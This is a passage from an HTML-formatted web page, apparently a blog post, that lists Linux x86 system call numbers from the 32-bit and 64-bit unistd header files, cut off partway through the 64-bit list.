class="keyword">define</span> __NR_futimesat 299</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatat64 300</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlinkat 301</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat 302</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_linkat 303</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlinkat 304</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlinkat 305</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmodat 306</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_faccessat 307</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pselect6 308</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ppoll 309</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unshare 310</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_robust_list 311</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_robust_list 312</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_splice 313</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync_file_range 314</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tee 315</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vmsplice 316</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_move_pages 317</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcpu 318</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_pwait 319</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimensat 320</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd 321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_create 322</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd 323</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fallocate 324</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_settime 325</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_gettime 326</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd4 327</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd2 328</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create1 329</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup3 330</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe2 331</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init1 332</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv 333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev 334</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_tgsigqueueinfo 335</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_perf_event_open 336</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmmsg 337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_init 338</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_mark 339</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prlimit64 340</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_name_to_handle_at 341</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open_by_handle_at 342</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_adjtime 343</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syncfs 344</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmmsg 345</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setns 346</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_readv 347</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_writev 348</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kcmp 349</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_finit_module 350</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setattr 351</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getattr 352</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat2 353</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_seccomp 354</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrandom 355</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_memfd_create 356</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bpf 357</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execveat 358</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socket 359</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketpair 360</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bind 361</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_connect 362</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listen 363</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept4 364</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockopt 365</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsockopt 366</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockname 367</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpeername 368</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendto 369</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmsg 370</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvfrom 371</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmsg 372</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shutdown 373</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_userfaultfd 374</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_membarrier 375</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock2 376</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_copy_file_range 377</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv2 378</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev2 379</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_32_H */</span></span></span><br></pre></td></tr></table></figure></div> ### 64 位 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_poll 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lseek 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mprotect 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munmap 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_brk 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigaction 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigprocmask 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn 15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioctl 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pread64 17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwrite64 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readv 19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_writev 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_access 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe 22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_select 23</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_yield 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mremap 25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msync 26</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mincore 27</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_madvise 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmget 29</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmat 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmctl 31</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup2 33</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pause 34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nanosleep 35</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getitimer 36</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_alarm 37</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setitimer 38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpid 39</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile 40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socket 41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_connect 42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept 43</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendto 44</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvfrom 45</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmsg 46</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmsg 47</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shutdown 48</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bind 49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listen 50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockname 51</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpeername 52</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketpair 53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsockopt 54</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockopt 55</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clone 56</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fork 57</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vfork 58</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit 60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_wait4 61</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kill 62</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uname 63</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semget 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semop 65</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semctl 66</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmdt 67</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgget 68</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgsnd 69</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgrcv 70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgctl 71</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flock 73</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsync 74</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fdatasync 75</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate 76</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate 77</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents 78</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcwd 79</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chdir 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchdir 81</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rename 82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdir 83</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rmdir 84</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_creat 85</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_link 86</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlink 87</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlink 88</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlink 89</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chmod 90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmod 91</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown 92</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown 93</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown 94</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umask 95</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettimeofday 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrlimit 97</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrusage 98</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysinfo 99</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_times 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ptrace 101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid 102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syslog 103</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid 104</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid 105</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid 106</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid 107</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid 108</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpgid 109</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getppid 110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgrp 111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsid 112</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid 113</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid 114</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups 115</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups 116</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid 117</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid 118</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid 119</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgid 121</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid 122</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid 123</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsid 124</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capget 125</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capset 126</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigpending 127</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigtimedwait 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigqueueinfo 129</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigsuspend 130</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaltstack 131</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utime 132</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknod 133</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uselib 134</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_personality 135</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ustat 136</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs 137</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs 138</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysfs 139</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpriority 140</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpriority 141</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setparam 142</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getparam 143</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setscheduler 144</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getscheduler 145</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_max 146</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_min 147</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_rr_get_interval 148</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock 149</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlock 150</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlockall 151</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlockall 152</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vhangup 153</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_modify_ldt 154</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pivot_root 155</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__sysctl 156</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prctl 157</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_arch_prctl 158</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_adjtimex 159</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setrlimit 160</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chroot 161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync 162</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_acct 163</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_settimeofday 164</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mount 165</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount2 166</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapon 167</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapoff 168</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_reboot 169</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sethostname 170</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setdomainname 171</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_iopl 172</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioperm 173</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_create_module 174</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_init_module 175</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_delete_module 176</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_kernel_syms 177</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_query_module 178</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_quotactl 179</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nfsservctl 180</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpmsg 181</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_putpmsg 182</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_afs_syscall 183</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tuxcall 184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_security 185</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettid 186</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readahead 187</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setxattr 188</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lsetxattr 189</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsetxattr 190</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getxattr 191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lgetxattr 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fgetxattr 193</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listxattr 194</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_llistxattr 195</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flistxattr 196</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_removexattr 197</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lremovexattr 198</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fremovexattr 199</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tkill 200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_time 201</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futex 202</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setaffinity 203</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getaffinity 204</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_thread_area 205</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_setup 206</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_destroy 207</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_getevents 208</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_submit 209</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_cancel 210</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_thread_area 211</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lookup_dcookie 212</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create 213</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl_old 214</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait_old 215</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_remap_file_pages 216</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents64 217</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_tid_address 218</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_restart_syscall 219</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semtimedop 220</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64 221</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_create 222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_settime 223</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_gettime 224</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_getoverrun 225</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_delete 226</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_settime 227</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_gettime 228</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_getres 229</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_nanosleep 230</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit_group 231</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait 232</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl 233</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tgkill 234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimes 235</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vserver 236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mbind 237</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_mempolicy 238</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_mempolicy 239</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_open 240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_unlink 241</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedsend 242</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedreceive 243</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_notify 244</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_getsetattr 245</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kexec_load 246</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitid 247</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_add_key 248</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_request_key 249</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_keyctl 250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_set 251</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_get 252</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init 253</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_add_watch 254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_rm_watch 255</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_migrate_pages 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_openat 257</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdirat 258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknodat 259</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchownat 260</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futimesat 261</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_newfstatat 262</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlinkat 263</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat 264</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_linkat 265</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlinkat 266</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlinkat 